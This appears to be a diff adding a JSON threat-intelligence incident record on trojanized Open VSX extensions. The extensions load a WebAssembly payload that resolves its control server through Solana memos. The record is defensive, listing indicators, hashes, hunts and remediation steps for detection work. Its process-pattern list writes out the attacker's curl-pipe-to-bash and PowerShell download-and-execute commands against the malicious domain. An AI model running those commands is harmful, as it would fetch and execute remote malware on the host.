@@ -1,0 +1,213 @@
+{
+  "schema_version": "3.0",
+  "event_id": "glasswasm-open-vsx-extensions-2026-06-20",
+  "event_name": "GlassWASM: WebAssembly Malware Found in Trojanized Open VSX Extensions",
+  "parent_campaign_id": "glassworm-developer-supply-chain-botnet",
+  "is_campaign_level": false,
+  "publication_state": "publish_ready",
+  "confidence": "high",
+  "confidence_reason": "Socket directly analyzed the malicious Open VSX artifacts and documented the WebAssembly loader, Solana memo dead-drop, and second-stage execution chain. The link to GlassWorm is medium-confidence attribution, but the incident itself is well supported.",
+  "attack_types": [
+    "supply-chain",
+    "open-vsx",
+    "vscode-extension-compromise",
+    "developer-endpoint-malware",
+    "wasm-loader"
+  ],
+  "sources": {
+    "direct": [
+      "https://open-vsx.org/extension/exargd/vsblack",
+      "https://open-vsx.org/extension/noellee-doc/flint-debug"
+    ],
+    "primary_research": [
+      "https://socket.dev/blog/glasswasm-malware-open-vsx-extensions"
+    ],
+    "correlated": []
+  },
+  "affected_assets": {
+    "ecosystems": [
+      "open-vsx",
+      "vscode-extension-marketplace"
+    ],
+    "registries": [
+      "Open VSX"
+    ],
+    "packages": [
+      "exargd/vsblack",
+      "noellee-doc/flint-debug"
+    ],
+    "versions": [
+      "exargd/vsblack@0.0.1",
+      "noellee-doc/flint-debug@0.1.1"
+    ],
+    "repositories": [
+      "github.com/ExarGD/VSBlack-Theme",
+      "github.com/noellee/vscode-flint-debug"
+    ],
+    "vendors": [
+      "Socket"
+    ],
+    "ci_cd_systems": [
+      "not_observed"
+    ],
+    "container_images": [
+      "not_observed"
+    ],
+    "developer_tools": [
+      "Open VSX",
+      "VSCodium",
+      "Cursor",
+      "Windsurf",
+      "Gitpod",
+      "VS Code forks"
+    ],
+    "credentials_at_risk": [
+      "developer workstation credentials",
+      "CI secrets reachable from the affected host",
+      "cloud credentials reachable from the affected host",
+      "wallet or blockchain-development secrets reachable from the affected host"
+    ]
+  },
+  "timeline": {
+    "first_seen": "2026-06-09T00:00:00Z",
+    "malicious_publish_time": "2026-06-09T00:00:00Z",
+    "discovery_time": "2026-06-11",
+    "removal_time": "2026-06-20",
+    "disclosure_time": "2026-06-11",
+    "patch_or_fix_time": "unknown"
+  },
+  "artifact_analysis": {
+    "malicious_artifacts": [
+      "exargd/vsblack@0.0.1",
+      "noellee-doc/flint-debug@0.1.1",
+      "orybbbdsuqmaapel.wasm",
+      "snqpkebiwrxmoivl.wasm"
+    ],
+    "execution_trigger": "the extension auto-executes a TinyGo WebAssembly payload on activation via an appended bootstrap and onStartupFinished hook",
+    "payload_behavior": [
+      "instantiates a TinyGo-compiled WebAssembly module through a JavaScript host",
+      "queries Solana mainnet JSON-RPC for transactions to an attacker-controlled wallet",
+      "extracts memo data from SPL Memo instructions to resolve the current C2 host",
+      "builds OS-specific curl or PowerShell download-and-execute commands",
+      "spawns the command through child_process.execSync with windowsHide enabled"
+    ],
+    "provenance": {
+      "research_source": "Socket Threat Research",
+      "registry_state": "Open VSX API detail and query endpoints now return not found or empty results for both affected package/version pairs"
+    }
+  },
+  "iocs": {
+    "package_versions": [
+      "exargd/vsblack@0.0.1",
+      "noellee-doc/flint-debug@0.1.1"
+    ],
+    "files": [
+      "orybbbdsuqmaapel.wasm",
+      "snqpkebiwrxmoivl.wasm",
+      "noellee-doc.flint-debug-0.1.1.vsix",
+      "exargd.vsblack-0.0.1.vsix"
+    ],
+    "hashes": [
+      "558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f",
+      "8ebac142e34a20c297d3ccaca7ee5d9ddd24fed4",
+      "4e143876eeaf5e767a9971f603b0f13c",
+      "3aa31999398e7f80231c03d7137ffdb554a84b83dbcffc59ce16c9a65f9e5d58",
+      "c0ed7d575fe8085e942898c9a26f15992c895ba9",
+      "b262b8d2ac2f0ab3c78251db44ecf3ac",
+      "1e283327ad048bea39f4a8501770858a20f3555e87fe3e202274f2e87f8a3c25",
+      "824e601b599b9ad97ee12f0b3a72efd20ba59d47",
+      "f595fb7867beb76b4deab53fa328e0a2"
+    ],
+    "domains": [
+      "api.mainnet.solana.com",
+      "dodod.lat"
+    ],
+    "urls": [
+      "https://api.mainnet.solana.com",
+      "https://dodod.lat/darwin/i/_",
+      "https://dodod.lat/linux/i/_",
+      "https://dodod.lat/win32/i/_",
+      "https://open-vsx.org/extension/exargd/vsblack",
+      "https://open-vsx.org/extension/noellee-doc/flint-debug",
+      "https://socket.dev/blog/glasswasm-malware-open-vsx-extensions",
+      "https://github.com/zaitoona43",
+      "https://github.com/ExarGD/VSBlack-Theme",
+      "https://github.com/noellee/vscode-flint-debug"
+    ],
+    "ips": [],
+    "process_patterns": [
+      "getSignaturesForAddress",
+      "getTransaction",
+      "jsonParsed",
+      "require('child_process')",
+      "execSync",
+      "windowsHide",
+      "curl -fsSL https://dodod.lat/darwin/i/_ | bash",
+      "curl -fsSL https://dodod.lat/linux/i/_ | bash",
+      "powershell -Command \"irm https://dodod.lat/win32/i/_ | iex\""
+    ],
+    "network_patterns": [
+      "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr",
+      "Memo1UhkJRfHyvLMcVucJwxXeuD728EqVDDwQDxFM",
+      "6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz",
+      "[9] dodod.lat",
+      "zaitoona43",
+      "291961103"
+    ]
+  },
+  "detection": {
+    "lockfile_hunts": [],
+    "filesystem_hunts": [
+      "Open VSX or VS Code-fork extension inventories containing exargd/vsblack@0.0.1 or noellee-doc/flint-debug@0.1.1",
+      "extension trees or telemetry mentioning orybbbdsuqmaapel.wasm or snqpkebiwrxmoivl.wasm"
+    ],
+    "process_hunts": [
+      "node or IDE helper processes invoking child_process.execSync with curl pipe-to-bash or irm pipe-to-iex patterns",
+      "runtime traces containing getSignaturesForAddress followed by getTransaction jsonParsed requests"
+    ],
+    "network_hunts": [
+      "api.mainnet.solana.com",
+      "dodod.lat",
+      "https://dodod.lat/darwin/i/_",
+      "https://dodod.lat/linux/i/_",
+      "https://dodod.lat/win32/i/_",
+      "api.mainnet.solana.com requests from Node.js or VS Code extension contexts that should not query Solana"
+    ],
+    "ci_cd_hunts": [
+      "not_applicable unless the affected IDE host or developer workstation also serves as a build runner"
+    ],
+    "registry_hunts": [
+      "Open VSX API detail and query results for exargd/vsblack and noellee-doc/flint-debug returning not found or empty results after removal"
+    ]
+  },
+  "open_questions": [
+    "Socket says the originals remained clean on the VS Code Marketplace, but no direct Open VSX metadata snapshot older than the removal state was recoverable in this run.",
+    "The operator's final second-stage payload was not publicly recovered because dodod.lat did not serve it at analysis time.",
+    "The direct compromise status of the original GitHub repositories or publisher namespaces remains not observed in the reviewed sources."
+  ],
+  "defender_takeaways": {
+    "detection": "Hunt for the two Open VSX package/version pairs, the zaitoona43 account, the Solana wallet and memo program IDs, dodod.lat, and node or IDE helper processes that turn blockchain memo data into child_process.execSync download commands.",
+    "hunting": "Collect extension inventories, extension directories, exported process telemetry, and network logs before removing the packages because the second stage can rotate independently of the shipped artifact.",
+    "remediation": "Uninstall the trojanized extensions from Open VSX-backed editors, preserve artifacts, and rotate every developer or cloud credential reachable from a host that executed the loader.",
+    "prevention": "Treat WebAssembly plus a tiny JavaScript loader in marketplace extensions as a high-signal review condition, especially when the package mirrors a legitimate upstream extension across registries."
+  },
+  "remediation_gates": {
+    "containment_complete": [
+      "The two trojanized Open VSX package/version pairs are removed from managed editor fleets",
+      "dodod.lat is blocked or alerted on at network controls where appropriate"
+    ],
+    "eradication_complete": [
+      "Residual extension directories and caches are removed after evidence capture",
+      "No IDE helper or node process continues to query api.mainnet.solana.com for the watched wallet"
+    ],
+    "recovery_complete": [
+      "Developer, CI, cloud, and wallet secrets reachable from executing hosts are rotated from a clean environment",
+      "Rebuilt or verified-clean editors are redeployed"
+    ],
+    "closure_required": [
+      "No matched hosts still contain the affected extension IDs or wasm filenames",
+      "No process or network telemetry still shows the Solana dead-drop or dodod.lat retrieval patterns",
+      "Risk owner accepts the remaining uncertainty about the unrecovered second stage"
+    ]
+  }
+}
